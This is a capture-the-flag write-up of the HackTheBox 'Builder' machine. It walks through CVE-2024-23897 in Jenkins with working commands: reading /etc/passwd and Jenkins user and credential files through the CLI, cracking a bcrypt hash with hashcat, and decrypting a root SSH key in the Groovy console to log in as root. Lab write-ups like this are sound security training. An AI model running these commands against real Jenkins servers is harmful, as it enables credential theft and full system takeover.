2024
### NMAP
```
sudo nmap -sC -sV -oN nmap-builder 10.10.11.10
```

![[HackTheBox/Linux/attachments/Pasted image 20250513210938.png]]
- 22, 8080

### Enumerate Web App 

![[HackTheBox/Linux/attachments/Pasted image 20250513211031.png]]
- Jenkins Version 2441

#### Checking exploits for Jenkins version 2441

There is an arbitrary file read vulnerability through the CLI that can lead to RCE

![[HackTheBox/Linux/attachments/Pasted image 20250513211320.png]]

#### Exploiting CVE-2024-23897

Downloading the Jenkins CLI 

```
wget 10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

![[HackTheBox/Linux/attachments/Pasted image 20250513211601.png]]

Run this jar file 

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080
```

Giving a fake command responds with "No such command `<the command>`"

![[HackTheBox/Linux/attachments/Pasted image 20250513211905.png]]

Testing out some stuff to see what files we can read 

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help '@/etc/passwd'
```

![[HackTheBox/Linux/attachments/Pasted image 20250513212202.png]]
- only one line displayed for `/etc/passwd`

Now this command returned the whole `/etc/passwd` file

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/etc/passwd'
```

![[HackTheBox/Linux/attachments/Pasted image 20250513212439.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250513212507.png]]

##### Create a bash script to test which Jenkin's parameters produce the most # of lines

Execute the jar client file to display the help menu

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 
```

Output before awk
![[HackTheBox/Linux/attachments/Pasted image 20250513212751.png]]

Use awk to extract the parameters

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | awk '/  [a-z]/ {print $1}'
```

Output after awk
![[HackTheBox/Linux/attachments/Pasted image 20250513212958.png]]

Now create a bash while loop to insert each of these Jenkins commands into the bash script 

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | awk '/  [a-z]/ {print $1}' | while read cmd; do java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $cmd '@/etc/passwd'; done
```

This threw an error
![[HackTheBox/Linux/attachments/Pasted image 20250513213615.png]]

Lots of weirdness with the bash script but this is the workaround

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 | awk '/  [a-z]/ {print $1}' | while read cmd; do printf "$cmd\t"; /bin/sh -c "java -jar jenkins-cli.jar -s http://10.10.11.10:8080 $cmd '@/etc/passwd' 2>&1" | wc -l &"; done
```

![[HackTheBox/Linux/attachments/Pasted image 20250513214520.png]]
- run.sh file

Output 
![[HackTheBox/Linux/attachments/Pasted image 20250513214617.png]]
- this is how we discover connect-node gives 21 lines of output :)

##### So... what file should we read 

Need to figure out where Jenkins is storing credentials. 

Pull down the latest version of Jenkins with docker

```
docker pull jenkins/jenkins
```

Start up the Jenkins docker container

```
docker run --rm -d jenkins/jenkins
```

![[HackTheBox/Linux/attachments/Pasted image 20250513215022.png]]

View docker logs 
```
docker logs d4cd
```

![[HackTheBox/Linux/attachments/Pasted image 20250513215128.png]]
- see the file path for the initial admin password 

Try to read this initial password 


```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/secrets/initialAdminPassword'
```

This file doesn't exist 
![[HackTheBox/Linux/attachments/Pasted image 20250513215407.png]]

Inspect the docker container 

```
docker inspect 
```

![[HackTheBox/Linux/attachments/Pasted image 20250513230950.png]]
- IP: `172.17.0.2`

Navigate to this IP in the browser and login with the password given during install.

![[HackTheBox/Linux/attachments/Pasted image 20250513231110.png]]

Start setting up Jenkins. 

Create  first admin user
![[HackTheBox/Linux/attachments/Pasted image 20250513231244.png]]

Then going back to the terminal...

Run docker ps to get the name of the container
```
docker ps
```

Attach to the container to interact with it

```
docker exec -it d4cd sh
```

![[HackTheBox/Linux/attachments/Pasted image 20250513231533.png]]

Find the admin username that we just created 

```
find . -name "*ippsec*"
```

![[HackTheBox/Linux/attachments/Pasted image 20250513231721.png]]
- got the default jenkins file path for stored users 

Navigate to this directory 
```
cd /var/jenkins_home
```

![[HackTheBox/Linux/attachments/Pasted image 20250513231938.png]]

Check out `secret.key`

![[HackTheBox/Linux/attachments/Pasted image 20250513232006.png]]

Check out `users/ippsec/config.xml` and see ippsec's password hash
![[HackTheBox/Linux/attachments/Pasted image 20250513232133.png]]

There is a long string after the username...but the string can be found in `users/users.xml` 

![[HackTheBox/Linux/attachments/Pasted image 20250513232243.png]]

##### Find a user credential now that we know where to find creds 

Re-execute the java jar client to read the users.xml file

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/users/users.xml'
```

![[HackTheBox/Linux/attachments/Pasted image 20250513232651.png]]
- find jennifer user so can copy jennifer_`long string`

Get jennifer's password hash from config.xml

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/users/jennifer_121082452345252485/config.xml'
```

![[HackTheBox/Linux/attachments/Pasted image 20250513232956.png]]
- grab this bcrypt hash 

Save jennifer's passsword hash to a file to crack with hashcat.

```
hashcat -m3200 jennifer.hash /usr/share/wordlists/rockyou.txt
```

Cracked her hash to `princess`

![[HackTheBox/Linux/attachments/Pasted image 20250513233215.png]]

##### Login to Jenkins with found creds!

![[HackTheBox/Linux/attachments/Pasted image 20250513233312.png]]

There is a Script Console in Jenkins called Groovy
![[HackTheBox/Linux/attachments/Pasted image 20250513234542.png]]

ls -la
![[HackTheBox/Linux/attachments/Pasted image 20250513234627.png]]

We could get a shell here, but not the pathhh

Find a Credentials Store
![[HackTheBox/Linux/attachments/Pasted image 20250513234726.png]]

Find an ssh key for root that is "concealed" but just need to open dev tools to reveal the private key 

![[HackTheBox/Linux/attachments/Pasted image 20250513234923.png]]
- this key is encrypted

Copy the private key and decrypt it using the Groovy scripting language and the script console

![[HackTheBox/Linux/attachments/Pasted image 20250513235154.png]]
- place the key in here 

And the key is decrypted! 😃

![[HackTheBox/Linux/attachments/Pasted image 20250513235302.png]]

Save this key to a file and chmod 600 the file. 

### SSH in with SSH Key

```
ssh -i key.id_rsa root@10.10.11.10
```

We get logged in!

![[HackTheBox/Linux/attachments/Pasted image 20250513235502.png]]
⭐got root⭐